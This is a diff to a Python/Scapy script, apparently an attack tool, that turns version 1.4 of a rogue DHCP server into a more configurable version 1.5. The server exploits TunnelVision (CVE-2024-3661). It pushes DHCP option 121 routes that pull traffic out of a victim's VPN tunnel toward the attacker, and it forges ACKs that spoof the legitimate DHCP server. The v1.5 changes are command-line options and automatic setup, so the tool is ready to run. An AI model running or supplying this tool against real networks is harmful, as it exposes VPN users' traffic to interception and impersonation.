@@ -1,38 +1,35 @@
 #!/usr/bin/env python3
-# v1.4
+# v1.5
+import argparse
+import ipaddress
+import os
+import sys
+
 from scapy.all import (
     Ether, IP, UDP, BOOTP, DHCP,
-    sniff, sendp, get_if_hwaddr, conf
+    sniff, sendp, get_if_hwaddr, get_if_addr, get_if_list, conf
 )
-import ipaddress
 
-SERVER_IP   = "192.168.88.3"   # our (attacker) DHCP service identity
-REAL_SERVER = "192.168.88.1"   # the legitimate DHCP server we race / impersonate
-SUBNET      = "192.168.88.0"
-NETMASK     = "255.255.255.0"
-GATEWAY     = "192.168.88.1"
-DNS         = "8.8.8.8"
-LEASE_TIME  = 3600
-POOL_START  = 100
-POOL_END    = 200
-IFACE       = conf.iface   # override with e.g. "eth0" if needed
+# ── Globals (populated in main()) ─────────────────────────────────────────────
 
-# When True, if a client REQUESTs its lease from REAL_SERVER (option 54),
-# we forge an ACK that *impersonates* REAL_SERVER (src IP + option 54 spoofed)
-# but carries OUR option 121, so the client installs our default route while
-# believing the legitimate server granted the lease. Requires winning the race
-# against the real ACK.
-IMPERSONATE = True
+SERVER_IP   = None
+REAL_SERVER = None
+SUBNET      = None
+NETMASK     = None
+GATEWAY     = None
+DNS         = None
+LEASE_TIME  = None
+IFACE       = None
+IMPERSONATE = None
+OPT121      = None
 
-leases    = {}   # mac -> ip
+leases    = {}
 allocated = set()
+pending   = {}
+pool      = []
 
-pool = [
-    str(ip)
-    for ip in ipaddress.IPv4Network(f"{SUBNET}/24", strict=False).hosts()
-    if POOL_START <= int(str(ip).split(".")[-1]) <= POOL_END
-]
 
+# ── Route encoding ─────────────────────────────────────────────────────────────
 
 def build_opt121(routes):
     """Encode classless static routes per RFC 3442.
@@ -45,33 +42,17 @@ def build_opt121(routes):
     for net_cidr, gw in routes:
         net    = ipaddress.IPv4Network(net_cidr, strict=False)
         prefix = net.prefixlen
-        sig    = (prefix + 7) // 8          # significant octets for network
+        sig    = (prefix + 7) // 8
         data  += bytes([prefix]) + net.network_address.packed[:sig]
         data  += ipaddress.IPv4Address(gw).packed
     return data
 
 
-# Beat the VPN's split-default routes (0.0.0.0/1 + 128.0.0.0/1) via longest-
-# prefix-match: four /2 routes blanket the whole IPv4 space and are MORE
-# specific than the VPN's /1, so the kernel prefers them and traffic exits
-# through SERVER_IP instead of the tunnel. The VPN endpoint's own /32 host
-# route stays most-specific, so the tunnel itself remains up (TunnelVision).
-HIJACK_ROUTES = [
-    ("0.0.0.0/2",   SERVER_IP),
-    ("64.0.0.0/2",  SERVER_IP),
-    ("128.0.0.0/2", SERVER_IP),
-    ("192.0.0.0/2", SERVER_IP),
-]
-OPT121 = build_opt121(HIJACK_ROUTES)
-
-
-pending = {}  # mac -> ip offered during DISCOVER but not yet ACKed
-
+# ── Pool helpers ───────────────────────────────────────────────────────────────
 
 def next_free_ip(mac, hint=None):
     if mac in leases:
         return leases[mac]
-    # honour the client's preferred IP if it falls inside our pool and is free
     if hint and hint in pool and hint not in allocated:
         return hint
     for ip in pool:
@@ -80,16 +61,18 @@ def next_free_ip(mac, hint=None):
     return None
 
 
+# ── DHCP handler ───────────────────────────────────────────────────────────────
+
 def handle_dhcp(pkt):
     if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
         return
 
-    dhcp_opts = {opt[0]: opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple)}
-    msg_type = dhcp_opts.get("message-type")
+    dhcp_opts  = {opt[0]: opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple)}
+    msg_type   = dhcp_opts.get("message-type")
     client_mac = pkt[Ether].src
 
     if msg_type == 1:   # DISCOVER
-        hint = str(dhcp_opts.get("requested_addr") or dhcp_opts.get("requested_IP_address") or "")
+        hint     = str(dhcp_opts.get("requested_addr") or dhcp_opts.get("requested_IP_address") or "")
         offer_ip = next_free_ip(client_mac, hint or None)
         if not offer_ip:
             print("[!] Pool exhausted")
@@ -99,7 +82,7 @@ def handle_dhcp(pkt):
         send_offer(pkt, client_mac, offer_ip)
 
     elif msg_type == 3:  # REQUEST
-        req_server = str(dhcp_opts.get("server_id", ""))
+        req_server   = str(dhcp_opts.get("server_id", ""))
         requested_ip = str(
             dhcp_opts.get("requested_addr")
             or dhcp_opts.get("requested_IP_address")
@@ -120,7 +103,6 @@ def handle_dhcp(pkt):
                 print(f"[REQUEST] {client_mac} -> ignored (client chose {req_server})")
             return
 
-        # fall back to the IP we offered if the client echoes 0.0.0.0
         if not requested_ip or requested_ip == "0.0.0.0":
             requested_ip = pending.get(client_mac, "")
         if not requested_ip:
@@ -145,7 +127,10 @@ def handle_dhcp(pkt):
             print(f"[RELEASE] {client_mac} released {ip}")
 
 
-def build_base(pkt, client_mac, your_ip, src_ip=SERVER_IP):
+# ── Packet builders ────────────────────────────────────────────────────────────
+
+def build_base(pkt, client_mac, your_ip, src_ip=None):
+    src_ip     = src_ip or SERVER_IP
     server_mac = get_if_hwaddr(IFACE)
     return (
         Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
@@ -165,25 +150,26 @@ def build_base(pkt, client_mac, your_ip, src_ip=SERVER_IP):
 def send_offer(pkt, client_mac, offer_ip):
     reply = build_base(pkt, client_mac, offer_ip) / DHCP(options=[
         ("message-type", "offer"),
-        ("server_id", SERVER_IP),
-        ("lease_time", LEASE_TIME),
-        ("subnet_mask", NETMASK),
-        ("name_server", DNS),
+        ("server_id",    SERVER_IP),
+        ("lease_time",   LEASE_TIME),
+        ("subnet_mask",  NETMASK),
+        ("name_server",  DNS),
         (121, OPT121),
         "end",
     ])
     sendp(reply, iface=IFACE, verbose=False)
 
 
-def send_ack(pkt, client_mac, ack_ip, server_ip=SERVER_IP):
+def send_ack(pkt, client_mac, ack_ip, server_ip=None):
     # server_ip defaults to us; when impersonating the real server we spoof
     # both the source IP (build_base) and option 54 to that server's address.
+    server_ip = server_ip or SERVER_IP
     reply = build_base(pkt, client_mac, ack_ip, src_ip=server_ip) / DHCP(options=[
         ("message-type", "ack"),
-        ("server_id", server_ip),
-        ("lease_time", LEASE_TIME),
-        ("subnet_mask", NETMASK),
-        ("name_server", DNS),
+        ("server_id",    server_ip),
+        ("lease_time",   LEASE_TIME),
+        ("subnet_mask",  NETMASK),
+        ("name_server",  DNS),
         (121, OPT121),
         "end",
     ])
@@ -199,20 +185,111 @@ def send_nak(pkt, _):
         BOOTP(op=2, xid=pkt[BOOTP].xid) /
         DHCP(options=[
             ("message-type", "nak"),
-            ("server_id", SERVER_IP),
+            ("server_id",    SERVER_IP),
             "end",
         ])
     )
     sendp(reply, iface=IFACE, verbose=False)
 
 
-if __name__ == "__main__":
-    print(f"[*] DHCP server v1.4 on {IFACE}")
-    print(f"[*] Pool: {SUBNET} [{POOL_START}-{POOL_END}], GW: {GATEWAY}")
+# ── Entry point ────────────────────────────────────────────────────────────────
+
+def main():
+    global SERVER_IP, REAL_SERVER, SUBNET, NETMASK, GATEWAY, DNS
+    global LEASE_TIME, IFACE, IMPERSONATE, OPT121, pool
+
+    if os.geteuid() != 0:
+        sys.exit("[!] Run as root:  sudo python3 121.py ...")
+
+    parser = argparse.ArgumentParser(
+        description="Rogue DHCP + option-121 VPN bypass (TunnelVision / CVE-2024-3661)"
+    )
+    parser.add_argument("-i", "--iface", default=None,
+                        help="Interface to listen/send on (default: Scapy auto)")
+    parser.add_argument("--list-ifaces", action="store_true",
+                        help="Print available interfaces with their IPs and exit")
+    parser.add_argument("--server-ip", default=None,
+                        help="Our IP on the LAN (default: auto-read from interface)")
+    parser.add_argument("--real-server", default="192.168.100.100",
+                        help="Legitimate DHCP server IP to impersonate (default: 192.168.100.100)")
+    parser.add_argument("--subnet", default="192.168.100.0",
+                        help="Network address for the lease pool (default: 192.168.100.0)")
+    parser.add_argument("--netmask", default="255.255.255.0",
+                        help="Subnet mask to advertise (default: 255.255.255.0)")
+    parser.add_argument("--gateway", default=None,
+                        help="Gateway to advertise (default: --real-server value)")
+    parser.add_argument("--dns", default="8.8.8.8",
+                        help="DNS server to advertise (default: 8.8.8.8)")
+    parser.add_argument("--pool-start", type=int, default=100,
+                        help="Last-octet start of lease pool (default: 100)")
+    parser.add_argument("--pool-end", type=int, default=200,
+                        help="Last-octet end of lease pool (default: 200)")
+    parser.add_argument("--lease-time", type=int, default=3600,
+                        help="DHCP lease time in seconds (default: 3600)")
+    parser.add_argument("--no-impersonate", action="store_true",
+                        help="Disable forging ACKs when the client picks the real server")
+    args = parser.parse_args()
+
+    IFACE = args.iface or str(conf.iface)
+
+    if args.list_ifaces:
+        print(f"{'Interface':<20} IP")
+        print("─" * 36)
+        for iface in get_if_list():
+            try:
+                ip = get_if_addr(iface)
+            except Exception:
+                ip = "?"
+            print(f"  {iface:<18} {ip}")
+        return
+
+    # Auto-detect our IP from the chosen interface
+    if args.server_ip:
+        SERVER_IP = args.server_ip
+    else:
+        SERVER_IP = get_if_addr(IFACE)
+        if not SERVER_IP or SERVER_IP == "0.0.0.0":
+            sys.exit(f"[!] Could not detect IP on {IFACE} — use --server-ip <ip>")
+        print(f"[*] Auto-detected server IP: {SERVER_IP}  (from {IFACE})")
+
+    REAL_SERVER = args.real_server
+    SUBNET      = args.subnet
+    NETMASK     = args.netmask
+    GATEWAY     = args.gateway or REAL_SERVER
+    DNS         = args.dns
+    LEASE_TIME  = args.lease_time
+    IMPERSONATE = not args.no_impersonate
+
+    pool = [
+        str(ip)
+        for ip in ipaddress.IPv4Network(f"{SUBNET}/24", strict=False).hosts()
+        if args.pool_start <= int(str(ip).split(".")[-1]) <= args.pool_end
+    ]
+
+    # Beat the VPN's split-default routes (0.0.0.0/1 + 128.0.0.0/1) via longest-
+    # prefix-match: four /2 routes blanket the whole IPv4 space and are MORE
+    # specific than the VPN's /1, so the kernel prefers them and traffic exits
+    # through SERVER_IP instead of the tunnel. The VPN endpoint's own /32 host
+    # route stays most-specific, so the tunnel itself remains up (TunnelVision).
+    OPT121 = build_opt121([
+        ("0.0.0.0/2",   SERVER_IP),
+        ("64.0.0.0/2",  SERVER_IP),
+        ("128.0.0.0/2", SERVER_IP),
+        ("192.0.0.0/2", SERVER_IP),
+    ])
+
+    print(f"[*] DHCP rogue server v1.5  iface={IFACE}  server={SERVER_IP}")
+    print(f"[*] Pool: {SUBNET} [{args.pool_start}-{args.pool_end}]  GW: {GATEWAY}  DNS: {DNS}")
     print(f"[*] Impersonation: {'ON (spoofing ' + REAL_SERVER + ')' if IMPERSONATE else 'OFF'}")
+    print("[*] Listening for DHCP...  Ctrl+C to stop\n")
+
     sniff(
         iface=IFACE,
         filter="udp and (port 67 or port 68)",
         prn=handle_dhcp,
         store=False,
     )
+
+
+if __name__ == "__main__":
+    main()
